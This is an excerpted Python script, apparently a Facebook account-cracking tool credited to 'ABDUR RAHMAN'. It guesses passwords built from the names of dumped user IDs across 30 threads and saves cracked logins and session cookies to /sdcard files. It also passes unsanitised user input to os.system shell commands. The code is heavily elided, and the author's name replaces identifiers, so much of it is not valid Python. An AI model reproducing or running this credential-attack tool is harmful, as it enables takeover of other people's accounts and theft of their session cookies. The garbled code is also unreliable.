...
from concurrent.futures import ThreadPoolExecutor as ABDUR RAHMANABDUR RAHMAN
from string import * 
...
sys.stdout.write('\x1b]2; ABDUR RAHMAN\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
\033[1;37m Owner   :            ABDUR RAHMAN
\033[1;37m Facebook:            Md Abdur Rahman 
\033[1;37m Github  :            
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back ABDUR RAHMAN Menu ")
        exit()
...
def ABDUR RAHMAN():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://chat.whatsapp.com/LpAAdCWAhxm8mOldKz3EeX')
        pass
    elif select =='F':
        os.system('xdg-open https://facebook.com/groups/2220459568268465/')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        ABDUR RAHMAN(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ABDUR RAHMAN] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ABDUR RAHMANb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ABDUR RAHMANb};{ckkk}"
                    print(f"\r{R} [ABDUR RAHMAN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/ABDUR RAHMAN_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/ABDUR RAHMAN_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [ABDUR RAHMAN-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/ABDUR RAHMAN_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ABDUR RAHMAN] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [ABDUR RAHMAN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/ABDUR RAHMAN_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/ABDUR RAHMAN_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [ABDUR RAHMAN-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ABDUR RAHMAN] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[ABDUR RAHMAN] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [ABDUR RAHMAN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/ABDUR RAHMAN_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with ABDUR RAHMANABDUR RAHMAN(max_workers=30) as ABDUR RAHMANworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                ABDUR RAHMANworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                ABDUR RAHMANworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                ABDUR RAHMANworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                ABDUR RAHMANworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/ABDUR RAHMAN.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/ABDUR RAHMAN.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    ABDUR RAHMAN = input('Put File Name :')
    print(" ")
    ABDUR RAHMAN = input('Saving Put File Name :')
    os.system('touch ' +ABDUR RAHMAN)
    os.system('sort -r '+ABDUR RAHMAN+' | uniq > '+ABDUR RAHMAN)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + ABDUR RAHMAN )
    print(47*'-')
    print("File Saved To :" + ABDUR RAHMAN )
    print(47*'-')
    input(f"{S} Press Enter To Back ABDUR RAHMAN Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/ABDUR RAHMAN.txt\n') 
        filepath = input("Put File Name: ")
...
def cutter():
    ...
    print(logo)
    print("Removed Successful From File: " + ABDUR RAHMAN )
    print("New File Saved:" + ABDUR RAHMAN )
    print(47*'-')
    input(f"{S} Press Enter To Back ABDUR RAHMAN Menu ")
    ABDUR RAHMAN(allkey)       
